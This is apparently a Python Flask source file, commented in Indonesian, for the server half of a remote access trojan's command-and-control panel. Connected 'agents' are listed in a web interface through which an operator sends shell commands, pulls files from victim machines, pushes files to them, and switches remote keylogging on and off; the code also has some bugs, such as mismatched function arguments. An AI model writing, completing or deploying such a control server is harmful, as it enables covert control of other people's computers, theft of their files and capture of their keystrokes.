import socket
import threading
import flask
from flask import *
import time
from pathlib import Path

# Menentukan IP dan Port listener
ip_address = '127.0.0.1'
port_number = 1234

thread_index = 0
# Membuat list untuk menyimpan objek-objek thread.
THREADS = []

# Membuat list untuk menyimpan input dan output perintah.
CMD_INPUT = []
CMD_OUTPUT = []

IPS = []

app = Flask(__name__)

for i in range(20):
    #THREADS.append("")
    CMD_INPUT.append("")
    CMD_OUTPUT.append("")
    IPS.append("")

# Mendefinisikan fungsi handle_connection untuk menangani koneksi dari klien.
def handle_connection(connection, address, thread_index):
    global CMD_INPUT
    global CMD_OUTPUT
   
    while CMD_INPUT[thread_index]!='quit':
         # Menerima pesan dari klien.
        msg = connection.recv(1024).decode()
        CMD_OUTPUT[thread_index] = msg
        while True:
            if CMD_INPUT[thread_index]!='':
                
                if CMD_INPUT[thread_index].split(" ")[0] == 'download':
                    # download filename
                    filename = CMD_INPUT[thread_index].split(" ")[1].split("/")[-1]
                    print(filename)
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    contents = connection.recv(1024*10000)
                    f = open(filename, 'wb')
                    f.write(contents)
                    f.close()
                    CMD_OUTPUT[thread_index] = 'File Transferred Successfully'
                    CMD_INPUT[thread_index] = ''
                elif CMD_INPUT[thread_index].split(" ")[0] == 'upload':
                    # upload filename 2048
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    filesize = CMD_INPUT[thread_index].split(" ")[2]
                    f = open('./output/' + filename, 'rb')
                    contents = f.read()
                    f.close()
                    connection.send(contents)
                    msg = connection.recv(2048).decode()
                    if msg == 'Got file':
                        CMD_OUTPUT[thread_index] = 'File Sent Successfully'
                        CMD_INPUT[thread_index] = ''
                    else:
                        CMD_OUTPUT[thread_index] = 'Some Error Occurred'
                        CMD_INPUT[thread_index] = ''
                elif CMD_INPUT[thread_index] == 'keylog on':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index] = msg
                    CMD_INPUT[thread_index] = ''
                elif CMD_INPUT[thread_index] == 'keylog off':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index] = msg
                    CMD_INPUT[thread_index] = ''
                else:
                    msg = CMD_INPUT[thread_index]
                    # Mengirim kembali pesan yang diterima ke klien.
                    connection.send(msg.encode())
                    CMD_INPUT[thread_index] = ''
                    break
    
    # Menutup koneksi setelah loop selesai (yaitu setelah menerima pesan 'quit').
    close_connection(connection)
    
# Mendefinisikan fungsi untuk menutup koneksi.
def close_connection(connection, thread_index):
    connection.close()
    THREADS[thread_index]=''
    IPS[thread_index]=''
    CMD_INPUT[thread_index]=''
    CMD_OUTPUT[thread_index]=''

def server_socket():
    # Membuat objek socket untuk server.
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Mengikat objek socket ke alamat IP dan nomor port yang telah ditentukan.
    ss.bind((ip_address, port_number))
    # Mengatur server untuk mendengarkan koneksi masuk dengan maksimal 5 koneksi yang bisa diantri.
    ss.listen(5)

    global THREADS
    global IPS

    # Loop tak terbatas untuk menerima koneksi masuk dari klien.
    while True:
        connection, address = ss.accept()
        thread_index = len(THREADS)
        # Membuat thread baru untuk menangani setiap koneksi klien.
        t = threading.Thread(target=handle_connection, args=(connection, address, len(THREADS)))
        # Menambahkan thread yang baru dibuat ke dalam list THREADS.
        THREADS.append(t)
        IPS.append(address)
        # Memulai eksekusi thread.
        t.start()

@app.before_first_request
def init_server():
    s1 = threading.Thread(target=server_socket)
    s1.start()

@app.route("/")
@app.route("/home")
def home():
    return render_template("index.html")

@app.route("/agents")
def agents():
    return render_template("agents.html", threads=THREADS, ips=IPS)

@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template("execute.html", name=agentname)

@app.route("/<agentname>/execute", methods=['GET', 'POST'])
def execute(agentname):
    if request.method=='POST':
        cmd = request.form['command']
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        CMD_INPUT[req_index] = cmd
        time.sleep(1)
        cmdoutput = CMD_OUTPUT[req_index]
        return render_template("execute.html", cmdoutput=cmdoutput, name=agentname)


if __name__ == '__main__':
    app.run(debug=True)